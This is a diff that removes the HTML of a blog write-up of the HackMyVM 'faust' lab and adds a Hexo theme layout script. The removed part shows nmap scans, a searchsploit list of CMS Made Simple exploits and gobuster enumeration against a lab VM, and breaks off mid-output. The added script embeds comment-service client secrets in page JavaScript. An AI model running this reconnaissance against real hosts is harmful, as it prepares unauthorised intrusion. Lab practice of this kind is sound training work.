@@ -1,327 +1,161 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>faust | hackboy</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="攻击机：kali  192.168.56.127 nat+桥接 靶机： 192.168.56.138  桥接 1.扫描网段12345678910111213141516┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24                  Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2">
-<meta property="og:type" content="article">
-<meta property="og:title" content="faust">
-<meta property="og:url" content="http://example.com/2023/07/30/faust/index.html">
-<meta property="og:site_name" content="hackboy">
-<meta property="og:description" content="攻击机：kali  192.168.56.127 nat+桥接 靶机： 192.168.56.138  桥接 1.扫描网段12345678910111213141516┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24                  Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/pic/image-20230730163252472.png">
-<meta property="og:image" content="http://example.com/pic/image-20230730164225680.png">
-<meta property="og:image" content="http://example.com/pic/image-20230730165020459.png">
-<meta property="og:image" content="http://example.com/pic/image-20230730165800603.png">
-<meta property="og:image" content="http://example.com/pic/image-20230730184807502.png">
-<meta property="article:published_time" content="2023-07-30T08:29:12.000Z">
-<meta property="article:modified_time" content="2023-08-31T03:38:09.718Z">
-<meta property="article:author" content="honkerZ">
-<meta property="article:tag" content="hackmyvm">
-<meta property="article:tag" content="msf">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/pic/image-20230730163252472.png">
-  
-    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+const { Component } = require('inferno');
+const classname = require('hexo-component-inferno/lib/util/classname');
+const Head = require('./common/head');
+const Navbar = require('./common/navbar');
+const Widgets = require('./common/widgets');
+const Footer = require('./common/footer');
+const Scripts = require('./common/scripts');
+const Search = require('./common/search');
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+module.exports = class extends Component {
+    render() {
+        const { site, config, page, helper, body } = this.props;
+        const { comment, use_pjax, has_banner } = config;
+        const { __, my_cdn, url_for } = helper;
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+        // 默认不加载公式，文中头部开启mathJax:true才加载
+        var isMath = page.mathJax != undefined && page.mathJax;
+        const language = page.lang || page.language || config.language;
+        const columnCount = Widgets.getColumnCount(config.widgets);
+        const hasComment = comment != undefined && comment.type != undefined && (comment.type == 'gitalk' || comment.type == 'valine')
+            && (comment.has_hot_recommend || comment.has_latest_comment);
+        var appKey;
+        var appId;
+        var userName;
+        var userRepo;
+        var isValine;
 
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+        if (comment != undefined && comment.type != undefined && comment.type == 'gitalk') {
+            appId = comment.client_id;
+            appKey = comment.client_secret;
+            userName = comment.owner;;
+            userRepo = comment.repo;
+            isValine = false;
+        } else if (comment != undefined && comment.type != undefined && comment.type == 'valine') {
+            appId = comment.app_id;
+            appKey = comment.app_key;
+            userName = comment.owner;
+            isValine = true;
+        }
+        var hotTitle = __('widget.hot_recommend');
+        var hotTip = __('widget.hot_recommend_tip');
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">hackboy</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">hacking...</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        // =====index hot_recommend
+        var hotRecommendStr =
+            `<div class="card widget">
+            <div class="card-content">
+                <h3 class="menu-label">${hotTitle}</h3><span id="index_hot_div">${hotTip}</span>
+            </div>
+        </div>`;
+
+        // =====index banner
+        var bannerStr =
+            `<div class="card widget">
+            <div class="card-content1 card-image">
+                <span id="banner"><div class="card-content ">Banner ${hotTip}</div></span>
+            </div>
+        </div>`;
         
-          <a class="main-nav-link" href="/">Home</a>
+        // mathjax support 使用方法 md文章头部开启mathJax: true，md文章中公式格式：$$f(x) = a_1x^n + a_2x^{n-1} + a_3x^{n-2}$$
+        var mathJaxJs = `function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };loadMathJax();`;
+
+        var pjaxJs = `var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
         
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(${hasComment}){
+                $.getScript('${my_cdn(url_for('/js/comment-issue-data.js'))}',function(){loadIssueData('${appId}','${appKey}','${userName}','${userRepo}',${isValine});});
+            }
+            if(${isMath}){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });`;
 
-      <div class="outer">
-        <section id="main"><article id="post-faust" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/30/faust/" class="article-date">
-  <time class="dt-published" datetime="2023-07-30T08:29:12.000Z" itemprop="datePublished">2023-07-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
-  </div>
+        if (comment == undefined || comment.type == undefined
+            || comment.type != 'gitalk'
+            || comment.has_hot_recommend == undefined
+            || !comment.has_hot_recommend) {
+            hotRecommendStr = '';
+        }
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      faust
-    </h1>
-  
+        var indexTopData = hotRecommendStr;
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>攻击机：kali  192.168.56.127 nat+桥接</p>
-<p>靶机： 192.168.56.138  桥接</p>
-<h2 id="1-扫描网段"><a href="#1-扫描网段" class="headerlink" title="1.扫描网段"></a>1.扫描网段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24                  </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-30</span> <span class="number">16</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.00069</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00056</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:E6:CC:<span class="number">38</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">2</span>D:C8:<span class="number">1</span>C (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.53</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        const hasBanner = has_banner != undefined && has_banner;
 
-<h2 id="2-扫描相关端口服务"><a href="#2-扫描相关端口服务" class="headerlink" title="2.扫描相关端口服务"></a>2.扫描相关端口服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p-  192.168.56.138 </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-30</span> <span class="number">16</span>:<span class="number">23</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">Host is up (<span class="number">0.0027</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span>+deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">540</span>a75c52656f5b05f6de1e07715c70d (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">0</span>bd789522d1316cb7496f55fdd3e528e (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">5</span>a900cf52b7fba1c83024de7a2a21d5b (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">38</span> (Debian)</span><br><span class="line">|_http<span class="literal">-generator</span>: CMS Made Simple - Copyright (C) <span class="number">2004</span><span class="literal">-2021</span>. All rights reserved.</span><br><span class="line">|_http<span class="literal">-title</span>: Home - cool_cms</span><br><span class="line"><span class="number">6660</span>/tcp open  unknown</span><br><span class="line">| fingerprint<span class="literal">-strings</span>: </span><br><span class="line">|   NULL, Socks5: </span><br><span class="line">|     MESSAGE <span class="keyword">FOR</span> WWW<span class="literal">-DATA</span>:</span><br><span class="line">|     [<span class="number">31</span><span class="type">m</span> <span class="type">www</span>-<span class="type">data</span> <span class="type">I</span> <span class="type">offer</span> <span class="type">you</span> <span class="type">a</span> <span class="type">dilemma</span>: <span class="type">if</span> <span class="type">you</span> <span class="type">agree</span> <span class="type">to</span> <span class="type">destroy</span> <span class="type">all</span> <span class="type">your</span> <span class="type">stupid</span> <span class="type">work</span>, <span class="type">then</span> <span class="type">you</span> <span class="type">have</span> <span class="type">a</span> <span class="type">reward</span> <span class="type">in</span> <span class="type">my</span> <span class="type">house...</span></span><br><span class="line">|<span class="type">_</span>    <span class="type">Paul</span></span><br><span class="line"><span class="number">1</span> <span class="type">service</span> <span class="type">unrecognized</span> <span class="type">despite</span> <span class="type">returning</span> <span class="type">data.</span> <span class="type">If</span> <span class="type">you</span> <span class="type">know</span> <span class="type">the</span> <span class="type">service</span>/<span class="type">version</span>, <span class="type">please</span> <span class="type">submit</span> <span class="type">the</span> <span class="type">following</span> <span class="type">fingerprint</span> <span class="type">at</span> <span class="type">https</span>://<span class="type">nmap.org</span>/<span class="type">cgi</span>-<span class="type">bin</span>/<span class="type">submit.cgi</span>?<span class="built_in">new-service</span> :</span><br><span class="line"><span class="type">SF</span>-<span class="type">Port6660</span>-<span class="type">TCP</span>:<span class="type">V</span>=<span class="number">7.93</span>%<span class="type">I</span>=<span class="number">7</span>%<span class="type">D</span>=<span class="number">7</span>/<span class="number">30</span>%<span class="type">Time</span>=<span class="number">64</span><span class="type">C61DFE</span>%<span class="type">P</span>=<span class="type">x86_64</span>-<span class="type">pc</span>-<span class="type">linux</span>-<span class="type">gnu</span>%<span class="type">r</span>(<span class="type">NU</span></span><br><span class="line"><span class="type">SF</span>:<span class="type">LL</span>,<span class="type">A5</span>,<span class="string">&quot;\n\n\x20\x20\x20MESSAGE\x20FOR\x20WWW-DATA:\n\n\x20\x1b\[31m\x20</span></span><br><span class="line"><span class="string">SF:\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20if\x20you\x20agre</span></span><br><span class="line"><span class="string">SF:e\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x20then\x20you\x20</span></span><br><span class="line"><span class="string">SF:have\x20a\x20reward\x20in\x20my\x20house\.\.\.\n\x20\x20\x20Paul\x20\x1</span></span><br><span class="line"><span class="string">SF:b\[0m\n&quot;</span>)%<span class="type">r</span>(<span class="type">Socks5</span>,<span class="type">A5</span>,<span class="string">&quot;\n\n\x20\x20\x20MESSAGE\x20FOR\x20WWW-DATA:\n\n\</span></span><br><span class="line"><span class="string">SF:x20\x1b\[31m\x20\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20i</span></span><br><span class="line"><span class="string">SF:f\x20you\x20agree\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x2</span></span><br><span class="line"><span class="string">SF:0then\x20you\x20have\x20a\x20reward\x20in\x20my\x20house\.\.\.\n\x20\x2</span></span><br><span class="line"><span class="string">SF:0\x20Paul\x20\x1b\[0m\n&quot;</span>);</span><br><span class="line"><span class="type">MAC</span> <span class="type">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">2</span><span class="type">D</span>:<span class="type">C8</span>:<span class="number">1</span><span class="type">C</span> (<span class="type">Oracle</span> <span class="type">VirtualBox</span> <span class="type">virtual</span> <span class="type">NIC</span>)</span><br><span class="line"><span class="type">Service</span> <span class="type">Info</span>: <span class="type">OS</span>: <span class="type">Linux</span>; <span class="type">CPE</span>: <span class="type">cpe</span>:/<span class="type">o</span>:<span class="type">linux</span>:<span class="type">linux_kernel</span></span><br><span class="line"></span><br><span class="line"><span class="type">Service</span> <span class="type">detection</span> <span class="type">performed.</span> <span class="type">Please</span> <span class="type">report</span> <span class="type">any</span> <span class="type">incorrect</span> <span class="type">results</span> <span class="type">at</span> <span class="type">https</span>://<span class="type">nmap.org</span>/<span class="type">submit</span>/ <span class="type">.</span></span><br><span class="line"><span class="type">Nmap</span> <span class="type">done</span>: <span class="number">1</span> <span class="type">IP</span> <span class="type">address</span> (<span class="number">1</span> <span class="type">host</span> <span class="type">up</span>) <span class="type">scanned</span> <span class="type">in</span> <span class="number">20.33</span> <span class="type">seconds</span></span><br></pre></td></tr></table></figure>
+        if (indexTopData == '' && hasBanner) {
+            indexTopData = bannerStr;
+        }
 
-<h2 id="3-查看网页"><a href="#3-查看网页" class="headerlink" title="3.查看网页"></a>3.查看网页</h2><p><img src="/../pic/image-20230730163252472.png" alt="image-20230730163252472"></p>
-<p>哦哦，这种架构看看是否漏洞</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># searchsploit CMS Made Simple                                       </span></span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"> Exploit Title                                                                                                                        |  Path</span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                    | php/remote/<span class="number">46627</span>.rb</span><br><span class="line">CMS Made Simple <span class="number">0.10</span> - <span class="string">&#x27;index.php&#x27;</span> Cross<span class="literal">-Site</span> Scripting                                                                               | php/webapps/<span class="number">26298</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">0.10</span> - <span class="string">&#x27;Lang.php&#x27;</span> Remote File Inclusion                                                                               | php/webapps/<span class="number">26217</span>.html</span><br><span class="line">CMS Made Simple <span class="number">1.0</span>.<span class="number">2</span> - <span class="string">&#x27;SearchInput&#x27;</span> Cross<span class="literal">-Site</span> Scripting                                                                            | php/webapps/<span class="number">29272</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.0</span>.<span class="number">5</span> - <span class="string">&#x27;Stylesheet.php&#x27;</span> SQL Injection                                                                                | php/webapps/<span class="number">29941</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.11</span>.<span class="number">10</span> - Multiple Cross<span class="literal">-Site</span> Scripting Vulnerabilities                                                               | php/webapps/<span class="number">32668</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.11</span>.<span class="number">9</span> - Multiple Vulnerabilities                                                                                     | php/webapps/<span class="number">43889</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.2</span> - Remote Code Execution                                                                                           | php/webapps/<span class="number">4442</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.2</span>.<span class="number">2</span> Module TinyMCE - SQL Injection                                                                                  | php/webapps/<span class="number">4810</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.2</span>.<span class="number">4</span> Module FileManager - Arbitrary File Upload                                                                      | php/webapps/<span class="number">5600</span>.php</span><br><span class="line">CMS Made Simple <span class="number">1.4</span>.<span class="number">1</span> - Local File Inclusion                                                                                          | php/webapps/<span class="number">7285</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.6</span>.<span class="number">2</span> - Local File Disclosure                                                                                         | php/webapps/<span class="number">9407</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.6</span>.<span class="number">6</span> - Local File Inclusion / Cross<span class="literal">-Site</span> Scripting                                                                   | php/webapps/<span class="number">33643</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.6</span>.<span class="number">6</span> - Multiple Vulnerabilities                                                                                      | php/webapps/<span class="number">11424</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.7</span> - Cross<span class="literal">-Site</span> Request Forgery                                                                                      | php/webapps/<span class="number">12009</span>.html</span><br><span class="line">CMS Made Simple <span class="number">1.8</span> - <span class="string">&#x27;default_cms_lang&#x27;</span> Local File Inclusion                                                                         | php/webapps/<span class="number">34299</span>.py</span><br><span class="line">CMS Made Simple <span class="number">1</span>.x - Cross<span class="literal">-Site</span> Scripting / Cross<span class="literal">-Site</span> Request Forgery                                                               | php/webapps/<span class="number">34068</span>.html</span><br><span class="line">CMS Made Simple <span class="number">2.1</span>.<span class="number">6</span> - <span class="string">&#x27;cntnt01detailtemplate&#x27;</span> Server<span class="literal">-Side</span> Template Injection                                                        | php/webapps/<span class="number">48944</span>.py</span><br><span class="line">CMS Made Simple <span class="number">2.1</span>.<span class="number">6</span> - Multiple Vulnerabilities                                                                                      | php/webapps/<span class="number">41997</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.1</span>.<span class="number">6</span> - Remote Code Execution                                                                                         | php/webapps/<span class="number">44192</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">14</span> - Arbitrary File Upload (Authenticated)                                                                        | php/webapps/<span class="number">48779</span>.py</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">14</span> - Authenticated Arbitrary File Upload                                                                          | php/webapps/<span class="number">48742</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">14</span> - Persistent Cross<span class="literal">-Site</span> Scripting (Authenticated)                                                              | php/webapps/<span class="number">48851</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">15</span> - <span class="string">&#x27;title&#x27;</span> Cross<span class="literal">-Site</span> Scripting (XSS)                                                                           | php/webapps/<span class="number">49793</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">15</span> - RCE (Authenticated)                                                                                          | php/webapps/<span class="number">49345</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">15</span> - Stored Cross<span class="literal">-Site</span> Scripting via SVG File Upload (Authenticated)                                              | php/webapps/<span class="number">49199</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">5</span> - (Authenticated) Remote Code Execution                                                                         | php/webapps/<span class="number">44976</span>.py</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">7</span> - (Authenticated) Remote Code Execution                                                                         | php/webapps/<span class="number">45793</span>.py</span><br><span class="line">CMS Made Simple &lt; <span class="number">1.12</span>.<span class="number">1</span> / &lt; <span class="number">2.1</span>.<span class="number">3</span> - Web Server Cache Poisoning                                                                       | php/webapps/<span class="number">39760</span>.txt</span><br><span class="line">CMS Made Simple &lt; <span class="number">2.2</span>.<span class="number">10</span> - SQL Injection                                                                                              | php/webapps/<span class="number">46635</span>.py</span><br><span class="line">CMS Made Simple Module Antz Toolkit <span class="number">1.02</span> - Arbitrary File Upload                                                                      | php/webapps/<span class="number">34300</span>.py</span><br><span class="line">CMS Made Simple Module Download Manager <span class="number">1.4</span>.<span class="number">1</span> - Arbitrary File Upload                                                                 | php/webapps/<span class="number">34298</span>.py</span><br><span class="line">CMS Made Simple Showtime2 Module <span class="number">3.6</span>.<span class="number">2</span> - (Authenticated) Arbitrary File Upload                                                        | php/webapps/<span class="number">46546</span>.py</span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+        if (page.path != 'index.html') {
+            indexTopData = '';
+        }
 
-<p>由网站底部可知道版本系统 2.2.5</p>
-<h2 id="4-渗透进行…"><a href="#4-渗透进行…" class="headerlink" title="4.渗透进行…"></a>4.渗透进行…</h2><p>查看脚本</p>
-<p><img src="/../pic/image-20230730164225680.png" alt="image-20230730164225680"></p>
-<p>逃不过扫描目录</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">usr</span>/…/<span class="type">exploitdb</span>/<span class="type">exploits</span>/<span class="type">php</span>/<span class="type">webapps</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.138/ -x php,txt,html</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.138</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Extensions:              php,txt,html</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">30</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">05</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/.html                (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/index.php            (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">19507</span>]</span><br><span class="line">/modules              (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">318</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">modules</span>/]</span><br><span class="line">/uploads              (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">318</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">uploads</span>/]</span><br><span class="line">/doc                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">314</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">doc</span>/]</span><br><span class="line">/admin                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">316</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">admin</span>/]</span><br><span class="line">/assets               (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">317</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">assets</span>/]</span><br><span class="line">/lib                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">314</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">lib</span>/]</span><br><span class="line">/config.php           (Status: <span class="number">200</span>) [<span class="type">Size</span>: 